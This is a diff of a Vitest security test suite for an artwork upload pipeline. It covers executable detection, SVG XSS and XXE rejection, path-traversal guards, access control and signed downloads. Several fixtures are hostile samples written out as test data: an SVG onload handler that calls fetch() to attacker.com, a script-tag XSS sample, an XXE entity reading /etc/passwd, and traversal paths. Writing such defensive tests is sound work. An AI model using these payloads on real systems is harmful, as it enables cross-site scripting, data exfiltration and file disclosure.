@@ -1,8 +1,8 @@
 import { describe, it, expect, beforeAll, afterAll } from 'vitest';
 import { getPayload } from 'payload';
 import { NextRequest } from 'next/server';
-import { readFile, unlink, rm } from 'node:fs/promises';
-import { existsSync } from 'node:fs';
+import { readFile, unlink, rm, mkdir } from 'node:fs/promises';
+import { existsSync, symlinkSync } from 'node:fs';
 import path from 'node:path';
 import configPromise from '@/payload.config';
 import { signCartId } from '@/modules/cart-checkout/logic/cartSession';
@@ -29,6 +29,7 @@ describe('B2B-03: Line-Level Artwork Asset Management & Private Storage Pipeline
   let testCartA: any;
   let testCartB: any;
   let adminUser: any;
+  let customerUser: any;
   let testProduct: any;
   const createdAssetIds: (string | number)[] = [];
   const createdCartIds: (string | number)[] = [];
@@ -63,7 +64,19 @@ describe('B2B-03: Line-Level Artwork Asset Management & Private Storage Pipeline
       });
     }
 
-    // 3. Fetch a physical product for cart line item binding tests
+    // 3. Create regular customer user for access control testing
+    customerUser = await payload.create({
+      collection: 'users',
+      data: {
+        email: `customer_b2b03_${Date.now()}@mwheba.com`,
+        password: 'TestPassword123!',
+        name: 'B2B Corporate Client',
+        roles: ['customer'],
+      },
+      context: { isSystemSeed: true },
+    });
+
+    // 4. Fetch a physical product for cart line item binding tests
     const prods = await payload.find({
       collection: 'products',
       where: {
@@ -96,107 +109,107 @@ describe('B2B-03: Line-Level Artwork Asset Management & Private Storage Pipeline
     // Cleanup created database records
     for (const id of createdAssetIds) {
       try {
-        await payload.delete({ collection: 'artwork-assets', id });
+        await payload.delete({
+          collection: 'artwork-assets',
+          id,
+          context: { isTrustedUpload: true },
+          overrideAccess: true,
+        });
       } catch {
-        // Ignore
-      }
-    }
-    for (const id of createdCartIds) {
-      try {
-        await payload.delete({ collection: 'carts', id });
-      } catch {
-        // Ignore
+        // Ignored
       }
     }
 
-    // Cleanup files on disk
+    // Cleanup physical files written to private storage during tests
     for (const filePath of testFilesToClean) {
       try {
         if (existsSync(filePath)) {
-          await unlink(filePath);
+          await unlink(filePath).catch(() => {});
         }
       } catch {
-        // Ignore
+        // Ignored
       }
     }
   });
 
   // =========================================================================
-  // 1. Unit Tests: File Validation & Malware/Executable Detection
+  // 1. File Validation, Format Detection & Malware Rejection
   // =========================================================================
-  describe('1. File Content Validation & Malware Detection Unit Tests', () => {
-    it('accepts genuine PNG buffer with valid 8-byte magic header', () => {
-      const pngHeader = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0x00, 0x00]);
-      const res = validateArtworkFile(pngHeader, 'company_logo.png', 'image/png');
+  describe('1. File Content, Format & Magic-Byte Validation', () => {
+    it('detects valid PNG magic bytes (89 50 4E 47)', () => {
+      const pngHeader = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0x00]);
+      expect(detectMagicBytes(pngHeader).detectedMime).toBe('image/png');
+    });
+
+    it('detects valid JPEG magic bytes (FF D8 FF)', () => {
+      const jpegHeader = Buffer.from([0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10]);
+      expect(detectMagicBytes(jpegHeader).detectedMime).toBe('image/jpeg');
+    });
+
+    it('detects valid PDF magic bytes (%PDF-)', () => {
+      const pdfHeader = Buffer.from('%PDF-1.7\n%âãÏÓ\n');
+      expect(detectMagicBytes(pdfHeader).detectedMime).toBe('application/pdf');
+    });
+
+    it('detects valid PSD magic bytes (8BPS)', () => {
+      const psdHeader = Buffer.from([0x38, 0x42, 0x50, 0x53, 0x00, 0x01]);
+      expect(detectMagicBytes(psdHeader).detectedMime).toBe('image/vnd.adobe.photoshop');
+    });
+
+    it('detects valid EPS/AI magic bytes (%!PS-Adobe or PostScript binary)', () => {
+      const epsHeader = Buffer.from('%!PS-Adobe-3.0 EPSF-3.0\n%%BoundingBox: 0 0 100 100');
+      expect(detectMagicBytes(epsHeader).detectedMime).toBe('application/postscript');
+    });
+
+    it('strictly REJECTS Windows DOS/PE executable header (MZ) disguised as image', () => {
+      const peHeader = Buffer.from([0x4d, 0x5a, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00]);
+      expect(detectMagicBytes(peHeader).isMaliciousExecutable).toBe(true);
+
+      const res = validateArtworkFile(peHeader, 'logo.png', 'image/png');
+      expect(res.isValid).toBe(false);
+      expect(res.error).toContain('Disguised executable binary detected');
+    });
+
+    it('strictly REJECTS Linux/Unix ELF executable header (\\x7FELF)', () => {
+      const elfHeader = Buffer.from([0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00]);
+      expect(detectMagicBytes(elfHeader).isMaliciousExecutable).toBe(true);
+
+      const res = validateArtworkFile(elfHeader, 'vector.ai', 'application/illustrator');
+      expect(res.isValid).toBe(false);
+      expect(res.error).toContain('Disguised executable binary detected');
+    });
+
+    it('validates a clean SVG XML document with vector paths', () => {
+      const cleanSvg = Buffer.from(
+        '<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100"><circle cx="50" cy="50" r="40" fill="navy"/></svg>'
+      );
+      const res = validateArtworkFile(cleanSvg, 'brand_logo.svg', 'image/svg+xml');
       expect(res.isValid).toBe(true);
-      expect(res.mimeType).toBe('image/png');
+      expect(res.mimeType).toBe('image/svg+xml');
       expect(res.sha256).toBeDefined();
     });
 
-    it('accepts genuine clean SVG vector text content', () => {
-      const svgContent = Buffer.from(
-        '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><circle cx="50" cy="50" r="40" fill="#0b1b3d"/></svg>',
-        'utf8'
+    it('strictly REJECTS malicious SVG files containing embedded <script> tags (XSS)', () => {
+      const xssSvg = Buffer.from(
+        '<svg xmlns="http://www.w3.org/2000/svg"><script>alert("XSS Vulnerability")</script><rect width="10" height="10"/></svg>'
       );
-      const res = validateArtworkFile(svgContent, 'corporate_vector.svg', 'image/svg+xml');
-      expect(res.isValid).toBe(true);
-      expect(res.mimeType).toBe('image/svg+xml');
-    });
-
-    it('accepts genuine PDF document with %PDF- header', () => {
-      const pdfBuffer = Buffer.from('%PDF-1.4\n%âãÏÓ\n1 0 obj\n<<>>\nendobj\ntrailer\n<<>>\n%%EOF', 'utf8');
-      const res = validateArtworkFile(pdfBuffer, 'print_catalog.pdf', 'application/pdf');
-      expect(res.isValid).toBe(true);
-      expect(res.mimeType).toBe('application/pdf');
-    });
-
-    it('accepts genuine Photoshop PSD file with 8BPS header', () => {
-      const psdBuffer = Buffer.from([0x38, 0x42, 0x50, 0x53, 0x00, 0x01, 0x00, 0x00]);
-      const res = validateArtworkFile(psdBuffer, 'master_branding.psd', 'image/vnd.adobe.photoshop');
-      expect(res.isValid).toBe(true);
-      expect(res.mimeType).toBe('image/vnd.adobe.photoshop');
-    });
-
-    it('strictly REJECTS disguised Windows executable (MZ header) with .png extension', () => {
-      // Disguised .exe: starts with 'MZ' (0x4D, 0x5A) but given filename 'innocent_logo.png'
-      const maliciousBuffer = Buffer.from([0x4d, 0x5a, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00, 0x04, 0x00]);
-      const res = validateArtworkFile(maliciousBuffer, 'innocent_logo.png', 'image/png');
+      const res = validateArtworkFile(xssSvg, 'malicious_xss.svg', 'image/svg+xml');
       expect(res.isValid).toBe(false);
-      expect(res.error).toContain('Disguised executable binary');
+      expect(res.error).toContain('Embedded <script> tags');
     });
 
-    it('strictly REJECTS disguised Linux ELF binary with .pdf extension', () => {
-      // Disguised ELF: starts with 0x7F 'E' 'L' 'F'
-      const elfBuffer = Buffer.from([0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00]);
-      const res = validateArtworkFile(elfBuffer, 'company_presentation.pdf', 'application/pdf');
-      expect(res.isValid).toBe(false);
-      expect(res.error).toContain('Disguised executable binary');
-    });
-
-    it('strictly REJECTS malicious SVG containing embedded <script> tags (XSS)', () => {
-      const maliciousSvg = Buffer.from(
-        '<svg xmlns="http://www.w3.org/2000/svg"><script>alert("pwned")</script><rect width="10" height="10"/></svg>',
-        'utf8'
+    it('strictly REJECTS malicious SVG files containing inline event handlers (onload, onclick)', () => {
+      const handlerSvg = Buffer.from(
+        '<svg xmlns="http://www.w3.org/2000/svg"><rect onload="fetch(\'http://attacker.com\')" width="50" height="50"/></svg>'
       );
-      const res = validateArtworkFile(maliciousSvg, 'vector_attack.svg', 'image/svg+xml');
+      const res = validateArtworkFile(handlerSvg, 'onload_xss.svg', 'image/svg+xml');
       expect(res.isValid).toBe(false);
-      expect(res.error).toContain('<script> tags are strictly forbidden');
+      expect(res.error).toContain('Inline DOM event handlers');
     });
 
-    it('strictly REJECTS malicious SVG containing inline DOM event handlers (onload)', () => {
-      const maliciousSvg = Buffer.from(
-        '<svg xmlns="http://www.w3.org/2000/svg" onload="fetch(\'http://attacker.com/steal\')"><rect width="10" height="10"/></svg>',
-        'utf8'
-      );
-      const res = validateArtworkFile(maliciousSvg, 'onload_attack.svg', 'image/svg+xml');
-      expect(res.isValid).toBe(false);
-      expect(res.error).toContain('Inline DOM event handlers are forbidden');
-    });
-
-    it('strictly REJECTS malicious SVG containing XXE DOCTYPE entity definitions', () => {
+    it('strictly REJECTS SVG files containing XXE (XML External Entity) payloads', () => {
       const xxeSvg = Buffer.from(
-        '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg>&xxe;</svg>',
-        'utf8'
+        '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg>&xxe;</svg>'
       );
       const res = validateArtworkFile(xxeSvg, 'xxe_attack.svg', 'image/svg+xml');
       expect(res.isValid).toBe(false);
@@ -211,7 +224,6 @@ describe('B2B-03: Line-Level Artwork Asset Management & Private Storage Pipeline
     });
 
     it('strictly REJECTS oversized files exceeding 50MB limit', () => {
-      // Mock length to test limit check without allocating 51MB in memory
       const fakeBuffer = {
         length: MAX_FILE_SIZE + 1024,
       } as any;
@@ -230,9 +242,162 @@ describe('B2B-03: Line-Level Artwork Asset Management & Private Storage Pipeline
   });
 
   // =========================================================================
-  // 2. Integration Tests: Upload Endpoint (/api/customization/upload-artwork)
+  // 2. Private Storage Boundaries & resolveArtworkPath Protection
   // =========================================================================
-  describe('2. Upload Route (/api/customization/upload-artwork)', () => {
+  describe('2. Private Storage Boundaries & Path Traversal Guards (resolveArtworkPath)', () => {
+    it('resolves valid relative paths strictly inside privateUploadDir', () => {
+      const relativeKey = 'artwork/abc-123/valid_logo.svg';
+      const resolved = resolveArtworkPath(relativeKey);
+      expect(resolved).toContain('private-uploads');
+      expect(resolved).toContain(path.normalize(relativeKey));
+    });
+
+    it('strictly REJECTS absolute paths on any platform (e.g. /etc/passwd or C:\\Windows)', () => {
+      expect(() => resolveArtworkPath('/etc/passwd')).toThrow(
+        /Path traversal rejected: Absolute paths are forbidden/
+      );
+      expect(() => resolveArtworkPath('C:\\Windows\\System32\\drivers\\etc\\hosts')).toThrow(
+        /Path traversal rejected: Absolute paths are forbidden/
+      );
+      expect(() => resolveArtworkPath('\\\\network-share\\leak.txt')).toThrow(
+        /Path traversal rejected: Absolute paths are forbidden/
+      );
+    });
+
+    it('strictly REJECTS sibling directory traversal via path.relative boundaries', () => {
+      expect(() => resolveArtworkPath('../private-uploads-secret/passwords.txt')).toThrow(
+        /Path traversal rejected: Attempted access outside private storage directory/
+      );
+    });
+
+    it('strictly REJECTS deep parent traversal (../../)', () => {
+      expect(() => resolveArtworkPath('artwork/../../outside_secret.key')).toThrow(
+        /Path traversal rejected: Attempted access outside private storage directory/
+      );
+      expect(() => resolveArtworkPath('../../../package.json')).toThrow(
+        /Path traversal rejected: Attempted access outside private storage directory/
+      );
+    });
+
+    it('strictly REJECTS symlink / junction escapes pointing outside private storage', async () => {
+      const junctionDir = path.join(privateUploadDir, `test_junction_${Date.now()}`);
+      try {
+        symlinkSync(path.resolve('src'), junctionDir, 'junction');
+        const relativeKey = `${path.basename(junctionDir)}/payload.config.ts`;
+        expect(() => resolveArtworkPath(relativeKey)).toThrow(
+          /Path traversal rejected: Symlink escapes private storage directory/
+        );
+      } finally {
+        try {
+          if (existsSync(junctionDir)) {
+            await rm(junctionDir, { recursive: true, force: true });
+          }
+        } catch {
+          // Cleanup
+        }
+      }
+    });
+  });
+
+  // =========================================================================
+  // 3. Direct Payload REST/API Access Control on ArtworkAssets (Point 1)
+  // =========================================================================
+  describe('3. Direct Payload REST/API Mutation Access Control (ArtworkAssets)', () => {
+    it('strictly PREVENTS customer users from calling payload.create directly without trusted upload context', async () => {
+      let threw = false;
+      try {
+        await payload.create({
+          collection: 'artwork-assets',
+          data: {
+            storageKey: 'forged/artwork.png',
+            originalFilename: 'forged.png',
+            fileSize: 1024,
+            mimeType: 'image/png',
+            scanStatus: 'clean',
+          },
+          user: customerUser,
+          overrideAccess: false,
+        });
+      } catch (err: any) {
+        threw = true;
+        expect(err.message).toMatch(/not allowed|forbidden|trusted upload/i);
+      }
+      expect(threw).toBe(true);
+    });
+
+    it('strictly PREVENTS customer users from updating storageKey or scanStatus directly', async () => {
+      // Create a valid asset via trusted context first
+      const validAsset = await payload.create({
+        collection: 'artwork-assets',
+        data: {
+          storageKey: `artwork/cust-${Date.now()}/client_logo.png`,
+          originalFilename: 'client_logo.png',
+          fileSize: 2048,
+          mimeType: 'image/png',
+          status: 'pending_order',
+          verificationStatus: 'valid',
+          scanStatus: 'unscanned',
+          uploader: customerUser.id,
+        },
+        context: { isTrustedUpload: true },
+        overrideAccess: true,
+      });
+      createdAssetIds.push(validAsset.id);
+
+      // Verify that default scanStatus is 'unscanned', NOT 'clean'
+      expect(validAsset.scanStatus).toBe('unscanned');
+
+      // Attempt to tamper with storageKey and scanStatus as customerUser
+      let threw = false;
+      try {
+        await payload.update({
+          collection: 'artwork-assets',
+          id: validAsset.id,
+          data: {
+            storageKey: 'malicious/tampered_path.png',
+            scanStatus: 'clean',
+          },
+          user: customerUser,
+          overrideAccess: false,
+        });
+      } catch (err: any) {
+        threw = true;
+        expect(err.message).toMatch(/not allowed|forbidden|restricted/i);
+      }
+      expect(threw).toBe(true);
+
+      // Verify asset in DB was not tampered with
+      const untouched = await payload.findByID({
+        collection: 'artwork-assets',
+        id: validAsset.id,
+        depth: 0,
+      });
+      expect(untouched.storageKey).toBe(validAsset.storageKey);
+      expect(untouched.scanStatus).toBe('unscanned');
+    });
+
+    it('confirms scanStatus defaults to "unscanned" upon record creation', async () => {
+      const newDoc = await payload.create({
+        collection: 'artwork-assets',
+        data: {
+          storageKey: `artwork/test-${Date.now()}/brand.png`,
+          originalFilename: 'brand.png',
+          fileSize: 1024,
+          mimeType: 'image/png',
+        },
+        context: { isTrustedUpload: true },
+        overrideAccess: true,
+      });
+      createdAssetIds.push(newDoc.id);
+
+      expect(newDoc.scanStatus).toBe('unscanned');
+    });
+  });
+
+  // =========================================================================
+  // 4. Integration Tests: Upload Endpoint (/api/customization/upload-artwork) (Point 2)
+  // =========================================================================
+  describe('4. Upload Route (/api/customization/upload-artwork) & Atomic Line Item Binding', () => {
     it('strictly rejects upload attempts without an active session cookie or auth with HTTP 401', async () => {
       const cleanSvg = '<svg xmlns="http://www.w3.org/2000/svg"><circle cx="10" cy="10" r="5"/></svg>';
       const blob = new Blob([cleanSvg], { type: 'image/svg+xml' });
@@ -250,7 +415,105 @@ describe('B2B-03: Line-Level Artwork Asset Management & Private Storage Pipeline
       expect(data.error).toBe('SESSION_REQUIRED');
     });
 
-    it('successfully uploads valid SVG artwork for a guest session and stores it outside public_html', async () => {
+    it('strictly rejects upload with non-existent lineItemId with HTTP 422 BEFORE saving file or record', async () => {
+      const signedCookieA = signCartId(testCartA.id);
+      const cleanSvg = '<svg xmlns="http://www.w3.org/2000/svg"><rect width="10" height="10"/></svg>';
+      const blob = new Blob([cleanSvg], { type: 'image/svg+xml' });
+      const formData = new FormData();
+      formData.append('file', blob, 'test_unlinked.svg');
+      formData.append('lineItemId', 'nonexistent-line-item-999');
+
+      const beforeAssets = await payload.find({
+        collection: 'artwork-assets',
+        where: { originalFilename: { equals: 'test_unlinked.svg' } },
+      });
+
+      const req = new NextRequest('http://localhost:3000/api/customization/upload-artwork', {
+        method: 'POST',
+        headers: {
+          Cookie: `${CART_COOKIE_NAME}=${signedCookieA}`,
+        },
+        body: formData,
+      });
+
+      const res = await uploadArtworkRoute(req);
+      expect(res.status).toBe(422);
+      const data = await res.json();
+      expect(data.error).toBe('LINE_ITEM_NOT_FOUND');
+      expect(data.message).toContain('nonexistent-line-item-999');
+
+      // Verify no database record was created
+      const afterAssets = await payload.find({
+        collection: 'artwork-assets',
+        where: { originalFilename: { equals: 'test_unlinked.svg' } },
+      });
+      expect(afterAssets.totalDocs).toBe(beforeAssets.totalDocs);
+    });
+
+    it('atomically rolls back file and asset record if cart update fails', async () => {
+      const signedCookieA = signCartId(testCartA.id);
+
+      // 1. Add real item to cart first
+      const addRes = await cartItemsPostRoute(
+        new NextRequest('http://localhost:3000/api/cart/items', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+            Cookie: `${CART_COOKIE_NAME}=${signedCookieA}`,
+          },
+          body: JSON.stringify({
+            productId: testProduct.id,
+            quantity: 10,
+            operationKey: `op_item_for_rollback_${Date.now()}`,
+          }),
+        })
+      );
+      const addData = await addRes.json();
+      const realLineItemId = addData.summary.items[0].id;
+
+      // 2. Prepare upload request for that lineItemId
+      const cleanSvg = '<svg xmlns="http://www.w3.org/2000/svg"><circle fill="red" r="10"/></svg>';
+      const blob = new Blob([cleanSvg], { type: 'image/svg+xml' });
+      const formData = new FormData();
+      const filename = `rollback_test_${Date.now()}.svg`;
+      formData.append('file', blob, filename);
+      formData.append('lineItemId', realLineItemId);
+
+      // 3. Mock payload.update on carts to simulate sudden failure
+      const originalUpdate = payload.update;
+      payload.update = async (args: any) => {
+        if (args.collection === 'carts') {
+          throw new Error('Simulated PostgreSQL lock failure during cart update');
+        }
+        return originalUpdate.call(payload, args);
+      };
+
+      try {
+        const req = new NextRequest('http://localhost:3000/api/customization/upload-artwork', {
+          method: 'POST',
+          headers: {
+            Cookie: `${CART_COOKIE_NAME}=${signedCookieA}`,
+          },
+          body: formData,
+        });
+
+        const res = await uploadArtworkRoute(req);
+        expect(res.status).toBe(500);
+        const data = await res.json();
+        expect(data.error).toBe('CART_BINDING_FAILED');
+
+        // 4. Verify database record was deleted (rolled back)
+        const orphanAssets = await payload.find({
+          collection: 'artwork-assets',
+          where: { originalFilename: { equals: filename } },
+        });
+        expect(orphanAssets.totalDocs).toBe(0);
+      } finally {
+        payload.update = originalUpdate;
+      }
+    });
+
+    it('successfully uploads valid SVG, stores it outside public web root, and records scanStatus="unscanned"', async () => {
       const signedCookieA = signCartId(testCartA.id);
       const cleanSvg = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 50 50"><rect width="50" height="50" fill="#0b1b3d"/></svg>';
       const blob = new Blob([cleanSvg], { type: 'image/svg+xml' });
@@ -273,6 +536,7 @@ describe('B2B-03: Line-Level Artwork Asset Management & Private Storage Pipeline
       expect(data.assetId).toBeDefined();
       expect(data.mimeType).toBe('image/svg+xml');
       expect(data.sha256).toBeDefined();
+      expect(data.scanStatus).toBe('unscanned');
       expect(data.storageKey).toMatch(/^artwork\/[a-f0-9-]+\/mwheba_corporate_logo\.svg$/);
 
       createdAssetIds.push(data.assetId);
@@ -296,14 +560,13 @@ describe('B2B-03: Line-Level Artwork Asset Management & Private Storage Pipeline
       expect(dbDoc).toBeDefined();
       expect(dbDoc.status).toBe('pending_order');
       expect(dbDoc.verificationStatus).toBe('valid');
-      expect(dbDoc.scanStatus).toBe('clean');
+      expect(dbDoc.scanStatus).toBe('unscanned');
       expect(String(dbDoc.ownerSession)).toBe(String(testCartA.id));
       expect(String(dbDoc.cart)).toBe(String(testCartA.id));
     });
 
     it('strictly rejects upload of disguised executable binary with HTTP 422', async () => {
       const signedCookieA = signCartId(testCartA.id);
-      // Malicious DOS PE executable disguised as PNG
       const fakePng = Buffer.from([0x4d, 0x5a, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00]);
       const blob = new Blob([fakePng], { type: 'image/png' });
       const formData = new FormData();
@@ -326,12 +589,9 @@ describe('B2B-03: Line-Level Artwork Asset Management & Private Storage Pipeline
 
     it('strictly rejects upload of oversized file (>50MB) with HTTP 413', async () => {
       const signedCookieA = signCartId(testCartA.id);
-      // Create a large buffer object that exceeds MAX_FILE_SIZE
       const oversizedBlob = new Blob([Buffer.alloc(100)], { type: 'image/png' });
-      // Mock size property
       Object.defineProperty(oversizedBlob, 'size', { value: MAX_FILE_SIZE + 1024 });
 
-      // Simulate a direct call to route with simulated oversized buffer
       const formData = new FormData();
       formData.append('file', oversizedBlob, 'massive_catalog.png');
 
@@ -344,19 +604,24 @@ describe('B2B-03: Line-Level Artwork Asset Management & Private Storage Pipeline
       });
 
       const res = await uploadArtworkRoute(req);
-      // Either 413 from buffer validation or 422
       expect([413, 422]).toContain(res.status);
     });
   });
 
   // =========================================================================
-  // 3. Line-Level Binding & Session Protection in Cart
+  // 5. Line-Level Binding & Session Protection in Cart
   // =========================================================================
-  describe('3. Line-Item Binding & Cross-Session Protection in Cart', () => {
+  describe('5. Line-Item Binding & Cross-Session Protection in Cart', () => {
+    let bindCartA: any;
+    let bindCartB: any;
     let assetOwnedByCartA: any;
 
     beforeAll(async () => {
-      // Create an artwork asset owned strictly by Cart A
+      bindCartA = await getOrCreateCart(payload);
+      bindCartB = await getOrCreateCart(payload);
+      createdCartIds.push(bindCartA.id, bindCartB.id);
+
+      // Create an artwork asset owned strictly by bindCartA
       assetOwnedByCartA = await payload.create({
         collection: 'artwork-assets',
         data: {
@@ -367,17 +632,18 @@ describe('B2B-03: Line-Level Artwork Asset Management & Private Storage Pipeline
           sha256: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855',
           status: 'pending_order',
           verificationStatus: 'valid',
-          scanStatus: 'clean',
-          ownerSession: String(testCartA.id),
-          cart: testCartA.id,
+          scanStatus: 'unscanned',
+          ownerSession: String(bindCartA.id),
+          cart: bindCartA.id,
         },
-        depth: 0,
+        context: { isTrustedUpload: true },
+        overrideAccess: true,
       });
       createdAssetIds.push(assetOwnedByCartA.id);
     });
 
     it('allows Cart A to attach its own artworkAssetId to a line item with separate customization fee', async () => {
-      const signedCookieA = signCartId(testCartA.id);
+      const signedCookieA = signCartId(bindCartA.id);
 
       const req = new NextRequest('http://localhost:3000/api/cart/items', {
         method: 'POST',
@@ -406,14 +672,14 @@ describe('B2B-03: Line-Level Artwork Asset Management & Private Storage Pipeline
       // Verify PostgreSQL persistence
       const dbCart = await payload.findByID({
         collection: 'carts',
-        id: testCartA.id,
+        id: bindCartA.id,
         depth: 0,
       });
       expect(dbCart.items[0].artworkAssetId).toBe(String(assetOwnedByCartA.id));
     });
 
     it('strictly PREVENTS Cart B from attaching Cart As artworkAssetId with HTTP 403 Forbidden', async () => {
-      const signedCookieB = signCartId(testCartB.id);
+      const signedCookieB = signCartId(bindCartB.id);
 
       const attackerReq = new NextRequest('http://localhost:3000/api/cart/items', {
         method: 'POST',
@@ -437,7 +703,7 @@ describe('B2B-03: Line-Level Artwork Asset Management & Private Storage Pipeline
     });
 
     it('strictly rejects non-existent artworkAssetId with HTTP 422', async () => {
-      const signedCookieA = signCartId(testCartA.id);
+      const signedCookieA = signCartId(bindCartA.id);
 
       const req = new NextRequest('http://localhost:3000/api/cart/items', {
         method: 'POST',
@@ -448,7 +714,7 @@ describe('B2B-03: Line-Level Artwork Asset Management & Private Storage Pipeline
         body: JSON.stringify({
           productId: testProduct.id,
           quantity: 10,
-          artworkAssetId: '99999999', // Non-existent asset ID
+          artworkAssetId: '99999999',
           operationKey: `op_invalid_art_${Date.now()}`,
         }),
       });
@@ -461,9 +727,9 @@ describe('B2B-03: Line-Level Artwork Asset Management & Private Storage Pipeline
   });
 
   // =========================================================================
-  // 4. Temporary Signed URLs & Private File Download Streaming
+  // 6. Temporary Signed URLs & Private File Download Streaming
   // =========================================================================
-  describe('4. Temporary Signed URLs & Private File Streaming', () => {
+  describe('6. Temporary Signed URLs & Private File Streaming', () => {
     let testAsset: any;
     let testAssetFileOnDisk: string;
     const testFileBytes = Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"><rect fill="gold" width="20" height="20"/></svg>');
@@ -488,11 +754,12 @@ describe('B2B-03: Line-Level Artwork Asset Management & Private Storage Pipeline
           sha256: 'test_hash_gold',
           status: 'pending_order',
           verificationStatus: 'valid',
-          scanStatus: 'clean',
+          scanStatus: 'unscanned',
           ownerSession: String(testCartA.id),
           cart: testCartA.id,
         },
-        depth: 0,
+        context: { isTrustedUpload: true },
+        overrideAccess: true,
       });
       createdAssetIds.push(testAsset.id);
     });
@@ -519,7 +786,6 @@ describe('B2B-03: Line-Level Artwork Asset Management & Private Storage Pipeline
     });
 
     it('strictly REJECTS GET download requests with expired tokens with HTTP 403 Forbidden', async () => {
-      // Generate an expired token (expired 10 minutes ago)
       const expiredNow = Date.now() - 1000 * 60 * 10;
       const { token } = createArtworkDownloadToken(testAsset.id, 60, expiredNow - 120 * 1000);
 
@@ -548,10 +814,9 @@ describe('B2B-03: Line-Level Artwork Asset Management & Private Storage Pipeline
       const data = await res.json();
 
       expect(data.success).toBe(true);
-      expect(data.expiresIn).toBe(900); // 15 minutes
+      expect(data.expiresIn).toBe(900);
       expect(data.url).toContain(`/api/customization/artwork/${testAsset.id}/download?token=`);
 
-      // Extract token and verify using verifyArtworkDownloadToken
       const token = new URL(`http://localhost:3000${data.url}`).searchParams.get('token')!;
       expect(verifyArtworkDownloadToken(token, testAsset.id)).toBe(true);
     });
@@ -583,19 +848,16 @@ describe('B2B-03: Line-Level Artwork Asset Management & Private Storage Pipeline
       const res = await downloadArtworkRoute(req, { params: Promise.resolve({ id: String(testAsset.id) }) });
       expect(res.status).toBe(200);
 
-      // Verify Headers
       expect(res.headers.get('content-type')).toContain('image/svg+xml');
       expect(res.headers.get('content-disposition')).toContain('attachment; filename="gold_badge.svg"');
       expect(res.headers.get('cache-control')).toContain('private, no-store');
       expect(res.headers.get('x-content-type-options')).toBe('nosniff');
 
-      // Verify Streamed Content matches original bytes
       const bodyBytes = Buffer.from(await res.arrayBuffer());
       expect(bodyBytes.equals(testFileBytes)).toBe(true);
     });
 
     it('allows super_admin staff to generate signed download link for production inspection', async () => {
-      // Simulate super_admin authorization
       const req = new NextRequest(`http://localhost:3000/api/customization/artwork/${testAsset.id}/sign`, {
         method: 'POST',
         headers: {
@@ -603,7 +865,6 @@ describe('B2B-03: Line-Level Artwork Asset Management & Private Storage Pipeline
         },
       });
 
-      // Pass user in request payload context
       const originalAuth = payload.auth;
       payload.auth = async () => ({ user: adminUser });
       try {
